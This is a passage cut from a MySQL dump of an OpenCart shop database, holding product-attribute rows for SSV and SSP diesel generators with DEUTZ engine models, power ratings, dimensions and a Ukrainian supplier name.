SSV'),(89,39,4,'Да'),(89,39,3,'Да'),(89,39,1,'Да'),(89,38,4,'2000'),(89,38,3,'2000'),(89,38,1,'2000'),(89,37,4,'1030'),(89,37,1,'1030'),(89,37,3,'1030'),(89,36,3,'2350'),(89,36,4,'2350'),(89,34,4,'15.95'),(89,36,1,'2350'),(89,34,3,'15.95'),(89,34,1,'15.95'),(89,33,4,'1500'),(89,33,3,'1500'),(89,33,1,'1500'),(89,32,4,'230/400'),(89,32,3,'230/400'),(89,32,1,'230/400'),(89,31,4,'0.8'),(89,31,3,'0.8'),(89,31,1,'0.8'),(89,30,4,'3'),(89,30,3,'3'),(89,30,1,'3'),(89,29,4,'50'),(89,29,3,'50'),(89,29,1,'50'),(89,25,4,'MJB250MB4'),(89,25,3,'MJB250MB4'),(89,25,1,'MJB250MB4'),(89,24,4,'TAD732GE'),(89,24,3,'TAD732GE'),(89,24,1,'TAD732GE'),(89,23,4,'DEUTZ'),(89,23,3,'DEUTZ'),(89,23,1,'DEUTZ'),(89,21,4,'31.74'),(89,21,3,'31.74'),(89,21,1,'31.74'),(89,20,4,'268.2'),(89,20,3,'268.2'),(89,20,1,'268.2'),(89,19,4,'Дизельные генераторы SSV'),(89,19,3,'Дизельные генераторы SSV'),(89,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(89,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(89,15,1,'163.9'),(89,15,3,'163.9'),(89,15,4,'163.9'),(89,16,1,'204.875'),(89,16,3,'204.875'),(89,16,4,'204.875'),(89,17,1,'68'),(89,17,3,'68'),(89,17,4,'68'),(89,18,1,'1640'),(89,18,3,'1640'),(89,18,4,'1640'),(89,19,1,'Дизельные генераторы SSV'),(90,40,1,'Да'),(90,39,4,'Да'),(90,39,3,'Да'),(90,39,1,'Да'),(90,38,4,'1800'),(90,38,3,'1800'),(90,38,1,'1800'),(90,37,3,'1050'),(90,37,4,'1050'),(90,36,4,'2650'),(90,37,1,'1050'),(90,36,1,'2650'),(90,36,3,'2650'),(90,34,4,'23.5'),(90,34,3,'23.5'),(90,34,1,'23.5'),(90,33,4,'1500'),(90,33,3,'1500'),(90,33,1,'1500'),(90,32,4,'230/400'),(90,32,3,'230/400'),(90,32,1,'230/400'),(90,31,4,'0.8'),(90,31,3,'0.8'),(90,31,1,'0.8'),(90,30,4,'3'),(90,30,3,'3'),(90,30,1,'3'),(90,29,4,'50'),(90,29,3,'50'),(90,29,1,'50'),(90,25,4,'MJB250LB4'),(90,25,3,'MJB250LB4'),(90,25,1,'MJB250LB4'),(90,24,4,'TAD734GE'),(90,24,3,'TAD734GE'),(90,24,1,'TAD734GE'),(90,23,4,'DEUTZ'),(90,23,3,'DEUTZ'),(90,23,1,'DEUTZ'),(90,21,4,'40,8'),(90,21,3,'40,8'),(90,21,1,'40,8'),(90,20,4,'360'),(90,20,3,'360'),(90,20,1,'360'),(90,19,4,'Дизельные генераторы SSV'),(90,19,3,'Дизельные генераторы SSV'),(90,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(90,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(90,15,1,'220'),(90,15,3,'220'),(90,15,4,'220'),(90,16,1,'275'),(90,16,3,'275'),(90,16,4,'275'),(90,17,1,'68'),(90,17,3,'68'),(90,17,4,'68'),(90,18,1,'1750'),(90,18,3,'1750'),(90,18,4,'1750'),(90,19,1,'Дизельные генераторы SSV'),(91,40,3,'Да'),(91,40,1,'Да'),(91,39,4,'Да'),(91,39,3,'Да'),(91,39,1,'Да'),(91,38,4,'1800'),(91,38,3,'1800'),(91,37,4,'1050'),(91,38,1,'1800'),(91,37,1,'1050'),(91,37,3,'1050'),(91,36,3,'2600'),(91,36,4,'2600'),(91,36,1,'2600'),(91,34,4,'32.62'),(91,34,3,'32.62'),(91,34,1,'32.62'),(91,33,4,'1500'),(91,33,3,'1500'),(91,33,1,'1500'),(91,32,4,'230/400'),(91,32,3,'230/400'),(91,32,1,'230/400'),(91,31,4,'0.8'),(91,31,3,'0.8'),(91,31,1,'0.8'),(91,30,4,'3'),(91,30,3,'3'),(91,30,1,'3'),(91,29,4,'50'),(91,29,3,'50'),(91,29,1,'50'),(91,25,4,'MJB315SB4'),(91,25,3,'MJB315SB4'),(91,25,1,'MJB315SB4'),(91,24,4,'TAD1342GE'),(91,24,3,'TAD1342GE'),(91,24,1,'TAD1342GE'),(91,23,4,'DEUTZ'),(91,23,3,'DEUTZ'),(91,23,1,'DEUTZ'),(91,21,4,'53.48'),(91,21,3,'53.48'),(91,21,1,'53.48'),(91,20,4,'504'),(91,20,3,'504'),(91,20,1,'504'),(91,19,4,'Дизельные генераторы SSV'),(91,19,3,'Дизельные генераторы SSV'),(91,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(91,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(91,15,1,'308'),(91,15,3,'308'),(91,15,4,'308'),(91,16,1,'385'),(91,16,3,'385'),(91,16,4,'385'),(91,17,1,'68'),(91,17,3,'68'),(91,17,4,'68'),(91,18,1,'2990'),(91,18,3,'2990'),(91,18,4,'2990'),(91,19,1,'Дизельные генераторы SSV'),(92,16,4,'440'),(92,17,1,'68'),(92,17,3,'68'),(92,17,4,'68'),(92,18,1,'3150'),(92,18,3,'3150'),(92,18,4,'3150'),(92,19,1,'Дизельные генераторы SSV'),(92,19,3,'Дизельные генераторы SSV'),(92,19,4,'Дизельные генераторы SSV'),(92,20,1,'576'),(92,20,3,'576'),(92,20,4,'576'),(92,21,1,'62.08'),(92,21,3,'62.08'),(92,21,4,'62.08'),(92,23,1,'DEUTZ'),(92,23,3,'DEUTZ'),(92,23,4,'DEUTZ'),(92,24,1,'TAD1344GE'),(92,24,3,'TAD1344GE'),(92,24,4,'TAD1344GE'),(92,25,1,'MJB315MA4'),(92,25,3,'MJB315MA4'),(92,25,4,'MJB315MA4'),(92,29,1,'50'),(92,29,3,'50'),(92,29,4,'50'),(92,30,1,'3'),(92,30,3,'3'),(92,30,4,'3'),(92,31,1,'0.8'),(92,31,3,'0.8'),(92,31,4,'0.8'),(92,32,1,'230/400'),(92,32,3,'230/400'),(92,32,4,'230/400'),(92,33,1,'1500'),(92,33,3,'1500'),(92,33,4,'1500'),(92,34,1,'32'),(92,34,3,'32'),(92,34,4,'32'),(92,36,1,'3200'),(92,36,3,'3200'),(92,36,4,'3200'),(92,37,1,'1150'),(92,37,3,'1150'),(92,37,4,'1150'),(92,38,1,'2000'),(92,16,3,'440'),(92,16,1,'440'),(92,15,4,'352'),(92,15,3,'352'),(92,15,1,'352'),(92,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(92,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(92,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(92,13,4,'400'),(92,13,3,'400'),(92,13,1,'400'),(92,12,4,'320'),(92,12,3,'320'),(92,12,1,'320'),(86,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(86,13,4,'100'),(86,13,3,'100'),(86,13,1,'100'),(86,12,4,'80'),(86,12,3,'80'),(86,12,1,'80'),(87,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(87,13,4,'132'),(87,13,3,'132'),(87,13,1,'132'),(87,12,4,'105.6'),(87,12,3,'105.6'),(87,12,1,'105.6'),(88,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(88,13,4,'150'),(88,13,3,'150'),(88,13,1,'150'),(88,12,4,'120'),(88,12,3,'120'),(88,12,1,'120'),(89,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(89,13,4,'186.25'),(89,13,3,'186.25'),(89,13,1,'186.25'),(89,12,4,'149'),(89,12,3,'149'),(89,12,1,'149'),(90,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(90,13,4,'250'),(90,13,3,'250'),(90,13,1,'250'),(90,12,4,'200'),(90,12,3,'200'),(90,12,1,'200'),(91,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(91,13,4,'350'),(91,13,3,'350'),(91,13,1,'350'),(91,12,4,'280'),(91,12,3,'280'),(91,12,1,'280'),(93,17,3,'68'),(93,17,4,'68'),(93,18,1,'3320'),(93,18,3,'3320'),(93,18,4,'3320'),(93,19,1,'Дизельные генераторы SSV'),(93,19,3,'Дизельные генераторы SSV'),(93,19,4,'Дизельные генераторы SSV'),(93,20,1,'648'),(93,20,3,'648'),(93,20,4,'648'),(93,21,1,'70.56'),(93,21,3,'70.56'),(93,21,4,'70.56'),(93,23,1,'DEUTZ'),(93,23,3,'DEUTZ'),(93,23,4,'DEUTZ'),(93,24,1,'TAD1345GE'),(93,24,3,'TAD1345GE'),(93,24,4,'TAD1345GE'),(93,25,1,'MJB315MB4'),(93,25,3,'MJB315MB4'),(93,25,4,'MJB315MB4'),(93,29,1,'50'),(93,29,3,'50'),(93,29,4,'50'),(93,30,1,'3'),(93,30,3,'3'),(93,30,4,'3'),(93,31,1,'0.8'),(93,31,3,'0.8'),(93,31,4,'0.8'),(93,32,1,'230/400'),(93,32,3,'230/400'),(93,32,4,'230/400'),(93,33,1,'1500'),(93,33,3,'1500'),(93,33,4,'1500'),(93,34,1,'35.82'),(93,34,3,'35.82'),(93,34,4,'35.82'),(93,36,1,'3200'),(93,36,3,'3200'),(93,36,4,'3200'),(93,37,1,'1150'),(93,37,3,'1150'),(93,37,4,'1150'),(93,38,1,'2000'),(93,38,3,'2000'),(93,38,4,'2000'),(93,17,1,'68'),(93,16,4,'495'),(93,16,3,'495'),(93,16,1,'495'),(93,15,4,'396'),(93,15,3,'396'),(93,15,1,'396'),(93,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(93,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(93,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(93,13,4,'450'),(93,13,3,'450'),(93,13,1,'450'),(93,12,4,'360'),(93,12,3,'360'),(93,12,1,'360'),(94,17,1,'68'),(94,17,3,'68'),(94,17,4,'68'),(94,18,1,'3450'),(94,18,3,'3450'),(94,18,4,'3450'),(94,19,1,'Дизельные генераторы SSV'),(94,19,3,'Дизельные генераторы SSV'),(94,19,4,'Дизельные генераторы SSV'),(94,20,1,'720'),(94,20,3,'720'),(94,20,4,'720'),(94,21,1,'79.8'),(94,21,3,'79.8'),(94,21,4,'79.8'),(94,23,1,'DEUTZ'),(94,23,3,'DEUTZ'),(94,23,4,'DEUTZ'),(94,24,1,'TAD1641GE'),(94,24,3,'TAD1641GE'),(94,24,4,'TAD1641GE'),(94,25,1,'MJB355SA4'),(94,25,3,'MJB355SA4'),(94,25,4,'MJB355SA4'),(94,29,1,'50'),(94,29,3,'50'),(94,29,4,'50'),(94,30,1,'3'),(94,30,3,'3'),(94,30,4,'3'),(94,31,1,'0.8'),(94,31,3,'0.8'),(94,31,4,'0.8'),(94,32,1,'230/400'),(94,32,3,'230/400'),(94,32,4,'230/400'),(94,33,1,'1500'),(94,33,3,'1500'),(94,33,4,'1500'),(94,34,1,'39.8'),(94,34,3,'39.8'),(94,34,4,'39.8'),(94,36,1,'3400'),(94,36,3,'3400'),(94,36,4,'3400'),(94,37,1,'1160'),(94,37,3,'1160'),(94,37,4,'1160'),(94,38,1,'2100'),(94,38,3,'2100'),(94,38,4,'2100'),(94,16,4,'550'),(94,16,3,'550'),(94,16,1,'550'),(94,15,4,'440'),(94,15,3,'440'),(94,15,1,'440'),(94,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(94,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(94,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(94,13,4,'500'),(94,13,3,'500'),(94,13,1,'500'),(94,12,4,'400'),(94,12,3,'400'),(94,12,1,'400'),(95,17,1,'68'),(95,17,3,'68'),(95,17,4,'68'),(95,18,1,'3850'),(95,18,3,'3850'),(95,18,4,'3850'),(95,19,1,'Дизельные генераторы SSV'),(95,19,3,'Дизельные генераторы SSV'),(95,19,4,'Дизельные генераторы SSV'),(95,20,1,'820.8'),(95,20,3,'820.8'),(95,20,4,'820.8'),(95,21,1,'90.29'),(95,21,3,'90.29'),(95,21,4,'90.29'),(95,23,1,'DEUTZ'),(95,23,3,'DEUTZ'),(95,23,4,'DEUTZ'),(95,24,1,'TAD1642GE'),(95,24,3,'TAD1642GE'),(95,24,4,'TAD1642GE'),(95,25,1,'MJB355SB4'),(95,25,3,'MJB355SB4'),(95,25,4,'MJB355SB4'),(95,29,1,'50'),(95,29,3,'50'),(95,29,4,'50'),(95,30,1,'3'),(95,30,3,'3'),(95,30,4,'3'),(95,31,1,'0.8'),(95,31,3,'0.8'),(95,31,4,'0.8'),(95,32,1,'230/400'),(95,32,3,'230/400'),(95,32,4,'230/400'),(95,33,1,'1500'),(95,33,3,'1500'),(95,33,4,'1500'),(95,34,1,'44.46'),(95,34,3,'44.46'),(95,34,4,'44.46'),(95,36,1,'3400'),(95,36,3,'3400'),(95,36,4,'3400'),(95,37,1,'1160'),(95,37,3,'1160'),(95,37,4,'1160'),(95,38,1,'2300'),(95,38,3,'2300'),(95,16,4,'627'),(95,16,3,'627'),(95,16,1,'627'),(95,15,4,'501.6'),(95,15,3,'501.6'),(95,15,1,'501.6'),(95,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(95,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(95,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(95,13,4,'570'),(95,13,3,'570'),(95,13,1,'570'),(95,12,4,'456'),(95,12,3,'456'),(95,12,1,'456'),(96,16,4,'687.5'),(96,17,1,'68'),(96,17,3,'68'),(96,17,4,'68'),(96,18,1,'4500'),(96,18,3,'4500'),(96,18,4,'4500'),(96,19,1,'Дизельные генераторы SSV'),(96,19,3,'Дизельные генераторы SSV'),(96,19,4,'Дизельные генераторы SSV'),(96,20,1,'900'),(96,20,3,'900'),(96,20,4,'900'),(96,21,1,'99.5'),(96,21,3,'99.5'),(96,21,4,'99.5'),(96,23,1,'DEUTZ'),(96,23,3,'DEUTZ'),(96,23,4,'DEUTZ'),(96,24,1,'TWD1643GE'),(96,24,3,'TWD1643GE'),(96,24,4,'TWD1643GE'),(96,25,1,'MJB355MA4'),(96,25,3,'MJB355MA4'),(96,25,4,'MJB355MA4'),(96,29,1,'50'),(96,29,3,'50'),(96,29,4,'50'),(96,30,1,'3'),(96,30,3,'3'),(96,30,4,'3'),(96,31,1,'0.8'),(96,31,3,'0.8'),(96,31,4,'0.8'),(96,32,1,'230/400'),(96,32,3,'230/400'),(96,32,4,'230/400'),(96,33,1,'1500'),(96,33,3,'1500'),(96,33,4,'1500'),(96,34,1,'49'),(96,34,3,'49'),(96,34,4,'49'),(96,36,1,'3600'),(96,36,3,'3600'),(96,36,4,'3600'),(96,37,1,'1350'),(96,37,3,'1350'),(96,37,4,'1350'),(96,38,1,'2450'),(96,16,3,'687.5'),(96,16,1,'687.5'),(96,15,4,'550'),(96,15,3,'550'),(96,15,1,'550'),(96,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(96,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(96,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(96,13,4,'625'),(96,13,3,'625'),(96,13,1,'625'),(96,12,4,'500'),(96,12,3,'500'),(96,12,1,'500'),(97,17,3,'68'),(97,17,4,'68'),(97,18,1,'560'),(97,18,3,'560'),(97,18,4,'560'),(97,19,1,'Дизельные генераторы SSP'),(97,19,3,'Дизельные генераторы SSP'),(97,19,4,'Дизельные генераторы SSP'),(97,20,1,'28.8'),(97,20,3,'28.8'),(97,20,4,'28.8'),(97,21,1,'4.6'),(97,21,3,'4.6'),(97,21,4,'4.6'),(97,23,1,'DEUTZ'),(97,23,3,'DEUTZ'),(97,23,4,'DEUTZ'),(97,24,1,'404D-22G'),(97,24,3,'404D-22G'),(97,24,4,'404D-22G'),(97,25,1,'MJB160SB4'),(97,25,3,'MJB160SB4'),(97,25,4,'MJB160SB4'),(97,29,1,'50'),(97,29,3,'50'),(97,29,4,'50'),(97,30,1,'3'),(97,30,3,'3'),(97,30,4,'3'),(97,31,1,'0.8'),(97,31,3,'0.8'),(97,31,4,'0.8'),(97,32,1,'230/400'),(97,32,3,'230/400'),(97,32,4,'230/400'),(97,33,1,'1500'),(97,33,3,'1500'),(97,33,4,'1500'),(97,34,1,'2.5'),(97,34,3,'2.5'),(97,34,4,'2.5'),(97,36,1,'1400'),(97,36,3,'1400'),(97,36,4,'1400'),(97,37,1,'520'),(97,37,3,'520'),(97,37,4,'520'),(97,38,1,'1200'),(97,38,3,'1200'),(97,38,4,'1200'),(97,39,1,'Да'),(70,38,3,'1150'),(70,38,4,'1150'),(70,39,1,'Да'),(70,39,3,'Да'),(70,39,4,'Да'),(77,40,4,'Да'),(77,41,1,'Да'),(77,41,3,'Да'),(77,41,4,'Да'),(71,40,1,'Да'),(78,40,4,'Да'),(78,41,1,'Да'),(78,41,3,'Да'),(78,41,4,'Да'),(71,39,4,'Да'),(79,40,1,'Да'),(79,40,3,'Да'),(79,40,4,'Да'),(79,41,1,'Да'),(79,41,3,'Да'),(79,41,4,'Да'),(71,39,1,'Да'),(71,39,3,'Да'),(80,13,3,'250'),(80,13,1,'250'),(80,12,4,'200'),(80,12,3,'200'),(80,12,1,'200'),(81,13,1,'300'),(81,13,3,'300'),(81,13,4,'300'),(81,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(81,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(72,40,3,'Да'),(72,40,4,'Да'),(72,41,1,'Да'),(72,41,3,'Да'),(72,41,4,'Да'),(76,39,4,'Да'),(82,40,3,'Да'),(82,40,4,'Да'),(82,41,1,'Да'),(82,41,3,'Да'),(82,41,4,'Да'),(73,40,4,'Да'),(73,41,1,'Да'),(73,41,3,'Да'),(73,41,4,'Да'),(76,39,3,'Да'),(83,40,3,'Да'),(83,40,4,'Да'),(83,41,1,'Да'),(83,41,3,'Да'),(83,41,4,'Да'),(77,12,3,'100'),(77,12,1,'100'),(78,13,3,'150'),(78,13,1,'150'),(78,12,4,'120'),(78,12,3,'120'),(78,12,1,'120'),(79,13,3,'185'),(79,13,1,'185'),(79,12,4,'148'),(79,12,3,'148'),(79,12,1,'148'),(80,38,4,'1800'),(80,39,1,'Да'),(81,12,4,'240'),(81,12,3,'240'),(81,12,1,'240'),(72,13,3,'31.25'),(72,13,1,'31.25'),(72,12,4,'25'),(72,12,3,'25'),(72,12,1,'25'),(82,13,1,'350'),(82,12,4,'280'),(82,12,3,'280'),(82,12,1,'280'),(73,13,3,'41.25'),(73,13,1,'41.25'),(73,12,4,'33'),(73,12,3,'33'),(73,12,1,'33'),(83,13,1,'400'),(83,12,4,'320'),(83,12,3,'320'),(83,12,1,'320'),(70,40,1,'Да'),(70,40,3,'Да'),(70,40,4,'Да'),(70,41,1,'Да'),(70,41,3,'Да'),(70,41,4,'Да'),(71,40,3,'Да'),(71,40,4,'Да'),(71,41,1,'Да'),(71,41,3,'Да'),(71,41,4,'Да'),(80,39,3,'Да'),(80,39,4,'Да'),(80,40,1,'Да'),(80,40,3,'Да'),(80,40,4,'Да'),(80,41,1,'Да'),(80,41,3,'Да'),(80,41,4,'Да'),(76,40,1,'Да'),(76,40,3,'Да'),(76,40,4,'Да'),(76,41,1,'Да'),(76,41,3,'Да'),(76,41,4,'Да'),(75,39,4,'Да'),(75,40,1,'Да'),(75,40,3,'Да'),(75,40,4,'Да'),(75,41,1,'Да'),(75,41,3,'Да'),(75,41,4,'Да'),(74,39,3,'Да'),(74,39,4,'Да'),(74,40,1,'Да'),(74,40,3,'Да'),(74,40,4,'Да'),(74,41,1,'Да'),(74,41,3,'Да'),(74,41,4,'Да'),(85,39,3,'Да'),(85,39,4,'Да'),(85,40,1,'Да'),(85,40,3,'Да'),(85,40,4,'Да'),(85,41,1,'Да'),(85,41,3,'Да'),(85,41,4,'Да'),(84,39,3,'Да'),(84,39,4,'Да'),(84,40,1,'Да'),(84,40,3,'Да'),(84,40,4,'Да'),(84,41,1,'Да'),(84,41,3,'Да'),(84,41,4,'Да'),(54,31,4,'0.8'),(54,32,1,'230/400'),(54,32,3,'230/400'),(54,32,4,'230/400'),(54,33,1,'1500'),(54,33,3,'1500'),(54,33,4,'1500'),(54,34,1,'13.2'),(54,34,3,'13.2'),(54,34,4,'13.2'),(54,36,1,'2600'),(54,36,3,'2600'),(54,36,4,'2600'),(54,37,1,'800'),(54,37,3,'800'),(54,37,4,'800'),(54,38,1,'1750'),(54,38,3,'1750'),(54,38,4,'1750'),(54,39,1,'Да'),(54,39,3,'Да'),(54,39,4,'Да'),(54,40,1,'Да'),(54,40,3,'Да'),(54,40,4,'Да'),(54,41,1,'Да'),(54,41,3,'Да'),(54,41,4,'Да'),(55,41,3,'Да'),(55,41,4,'Да'),(56,38,1,'1800'),(56,38,3,'1800'),(56,38,4,'1800'),(56,39,1,'Да'),(56,39,3,'Да'),(56,39,4,'Да'),(56,40,1,'Да'),(56,40,3,'Да'),(56,40,4,'Да'),(56,41,1,'Да'),(56,41,3,'Да'),(56,41,4,'Да'),(57,40,1,'Да'),(57,40,3,'Да'),(57,40,4,'Да'),(57,41,1,'Да'),(57,41,3,'Да'),(57,41,4,'Да'),(50,39,1,'Да'),(50,39,3,'Да'),(50,39,4,'Да'),(50,40,1,'Да'),(50,40,3,'Да'),(50,40,4,'Да'),(50,41,1,'Да'),(50,41,3,'Да'),(50,41,4,'Да'),(58,37,1,'1110\r\n'),(58,37,3,'1110'),(58,37,4,'1110\r\n'),(58,38,1,'1900\r\n'),(58,38,3,'1900\r\n'),(58,38,4,'1900\r\n'),(58,39,1,'Да'),(58,39,3,'Да'),(58,39,4,'Да'),(58,40,1,'Да'),(58,40,3,'Да'),(58,40,4,'Да'),(58,41,1,'Да'),(58,41,3,'Да'),(58,41,4,'Да'),(53,37,4,'650'),(53,38,1,'1450'),(53,38,3,'1450'),(53,38,4,'1450'),(53,39,1,'Да'),(53,39,3,'Да'),(53,39,4,'Да'),(53,40,1,'Да'),(53,40,3,'Да'),(53,40,4,'Да'),(53,41,1,'Да'),(53,41,3,'Да'),(53,41,4,'Да'),(52,41,3,'Да'),(52,41,4,'Да'),(69,39,3,'Да'),(69,39,4,'Да'),(69,40,1,'Да'),(69,40,3,'Да'),(69,40,4,'Да'),(69,41,1,'Да'),(69,41,3,'Да'),(69,41,4,'Да'),(59,38,4,'1200\r\n\r\n'),(59,39,1,'Да'),(59,39,3,'Да'),(59,39,4,'Да'),(59,40,1,'Да'),(59,40,3,'Да'),(59,40,4,'Да'),(59,41,1,'Да'),(59,41,3,'Да'),(59,41,4,'Да'),(61,37,4,'800'),(61,38,1,'1550\r\n\r\n'),(61,38,3,'1550'),(61,38,4,'1550\r\n'),(61,39,1,'Да'),(61,39,3,'Да'),(61,39,4,'Да'),(61,40,1,'Да'),(61,40,3,'Да'),(61,40,4,'Да'),(61,41,1,'Да'),(61,41,3,'Да'),(61,41,4,'Да'),(62,48,3,'гарантия на 2000 часов'),(62,48,4,'гарантия на 2000 часов'),(62,49,1,'учебный центр'),(62,49,3,'учебный центр'),(62,49,4,'учебный центр'),(63,39,1,'Да'),(63,39,3,'Да'),(63,39,4,'Да'),(63,40,1,'Да'),(63,40,3,'Да'),(63,40,4,'Да'),(63,41,1,'Да'),(63,41,3,'Да'),(63,41,4,'Да'),(64,38,4,'1750'),(64,39,1,'Да'),(64,39,3,'Да'),(64,39,4,'Да'),(64,40,1,'Да'),(64,40,3,'Да'),(64,40,4,'Да'),(64,41,1,'Да'),(64,41,3,'Да'),(64,41,4,'Да'),(65,39,3,'Да'),(65,39,4,'Да'),(65,40,1,'Да'),(65,40,3,'Да'),(65,40,4,'Да'),(65,41,1,'Да'),(65,41,3,'Да'),(65,41,4,'Да'),(66,39,3,'Да'),(66,39,4,'Да'),(66,40,1,'Да'),(66,40,3,'Да'),(66,40,4,'Да'),(66,41,1,'Да'),(66,41,3,'Да'),(66,41,4,'Да'),(67,38,4,'1750'),(67,39,1,'Да'),(67,39,3,'Да'),(67,39,4,'Да'),(67,40,1,'Да'),(67,40,3,'Да'),(67,40,4,'Да'),(67,41,1,'Да'),(67,41,3,'Да'),(67,41,4,'Да'),(68,39,1,'Да'),(68,39,3,'Да'),(68,39,4,'Да'),(68,40,1,'Да'),(68,40,3,'Да'),(68,40,4,'Да'),(68,41,1,'Да'),(68,41,3,'Да'),(68,41,4,'Да'),(86,40,4,'Да'),(86,41,1,'Да'),(86,41,3,'Да'),(86,41,4,'Да'),(97,17,1,'68'),(97,16,4,'22'),(97,16,3,'22'),(97,16,1,'22'),(97,15,4,'17.6'),(97,15,3,'17.6'),(97,15,1,'17.6'),(97,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(97,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(97,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(97,13,4,'20'),(97,13,3,'20'),(97,13,1,'20'),(97,12,4,'16'),(97,12,3,'16'),(97,12,1,'16'),(96,38,3,'2450'),(96,38,4,'2450'),(96,39,1,'Да'),(96,39,3,'Да'),(96,39,4,'Да'),(96,40,1,'Да'),(96,40,3,'Да'),(96,40,4,'Да'),(96,41,1,'Да'),(96,41,3,'Да'),(96,41,4,'Да'),(95,38,4,'2300'),(95,39,1,'Да'),(95,39,3,'Да'),(95,39,4,'Да'),(95,40,1,'Да'),(95,40,3,'Да'),(95,40,4,'Да'),(95,41,1,'Да'),(95,41,3,'Да'),(95,41,4,'Да'),(94,39,1,'Да'),(94,39,3,'Да'),(94,39,4,'Да'),(94,40,1,'Да'),(94,40,3,'Да'),(94,40,4,'Да'),(94,41,1,'Да'),(94,41,3,'Да'),(94,41,4,'Да'),(93,39,1,'Да'),(93,39,3,'Да'),(93,39,4,'Да'),(93,40,1,'Да'),(93,40,3,'Да'),(93,40,4,'Да'),(93,41,1,'Да'),(93,41,3,'Да'),(93,41,4,'Да'),(92,38,3,'2000'),(92,38,4,'2000'),(92,39,1,'Да'),(92,39,3,'Да'),(92,39,4,'Да'),(92,40,1,'Да'),(92,40,3,'Да'),(92,40,4,'Да'),(92,41,1,'Да'),(92,41,3,'Да'),(92,41,4,'Да'),(91,40,4,'Да'),(91,41,1,'Да'),(91,41,3,'Да'),(91,41,4,'Да'),(90,40,3,'Да'),(90,40,4,'Да'),(90,41,1,'Да'),(90,41,3,'Да'),(90,41,4,'Да'),(89,40,1,'Да'),(89,40,3,'Да'),(89,40,4,'Да'),(89,41,1,'Да'),(89,41,3,'Да'),(89,41,4,'Да'),(88,40,4,'Да'),(88,41,1,'Да'),(88,41,3,'Да'),(88,41,4,'Да'),(87,40,1,'Да'),(87,40,3,'Да'),(87,40,4,'Да'),(87,41,1,'Да'),(87,41,3,'Да'),(87,41,4,'Да'),(98,12,1,'80'),(98,12,3,'80'),(98,12,4,'80'),(98,13,1,'100'),(98,13,3,'100'),(98,13,4,'100'),(98,14,1,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(98,14,3,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(98,14,4,'НВП СПЕЦ - СЕРВИС (Украина)\r\n'),(98,15,1,'88'),(98,15,3,'88'),(98,15,4,'88'),(98,16,1,'110'),(98,16,3,'110'),(98,16,4,'110'),(98,17,1,'68'),(98,17,3,'68'),(98,17,4,'68'),(98,18,1,'1300'),(98,18,3,'1300'),(98,18,4,'1300'),(98,19,1,'Дизельные генераторы SSV'),(98,19,3,'Дизельные генераторы SSV'),(98,19,4,'Дизельные генераторы SSV'),(98,20,1,'144'),(98,20,3,'144'),(98,20,4,'144'),(98,21,1,'17.36'),(98,21,3,'17.36'),(98,21,4,'17.36'),(98,23,1,'DEUTZ'),(98,23,3,'DEUTZ'),(98,23,4,'DEUTZ'),(98,24,1,'TAD531GE'),(98,24,3,'TAD531GE'),(98,24,4,'TAD531GE'),(98,25,1,'MJB225MA4'),(98,25,3,'MJB225MA4'),(98,25,4,'MJB225MA4'),(98,29,1,'50'),(98,29,3,'50'),(98,29,4,'50'),(98,30,1,'3'),(98,30,3,'3'),(98,30,4,'3'),(98,31,1,'0.8'),(98,31,3,'0.8'),(98,31,4,'0.8'),(98,32,1,'230/400'),(98,32,3,'230/400'),(98,32,4,'230/400'),(98,33,1,'1500'),(98,33,3,'1500'),(98,33,4,'1500'),(98,34,1,'9.04'),(98,34,3,'9.04'),(98,34,4,'9.04'),(98,36,1,'2150'),(98,36,3,'2150'),(98,36,4,'2150'),(98,37,1,'800'),(98,37,3,'800'),(98,37,4,'800'),(98,38,1,'1750'),(98,38,3,'1750'),(98,38,4,'1750'),(98,39,1,'Да'),(98,39,3,'Да'),(98,39,4,'Да'),(98,40,1,'Да'),(98,40,3,'Да'),(98,40,4,'Да'),(98,41,1,'Да'),(98,41,3,'Да'),(98,41,4,'Да'),(97,39,3,'Да'),(97,39,4,'Да'),(97,40,1,'Да'),(97,40,3,'Да'),(97,40,4,'Да'),(97,41,1,'Да'),(97,41,3,'Да'),(97,41,4,'Да');
/*!40000 ALTER TABLE `oc_product_attribute` ENABLE KEYS */;
UNLOCK TABLES;

LOCK TABLES `oc_product_description` WRITE;
/*!40000 ALTER TABLE `oc_product_description` DISABLE KEYS */;
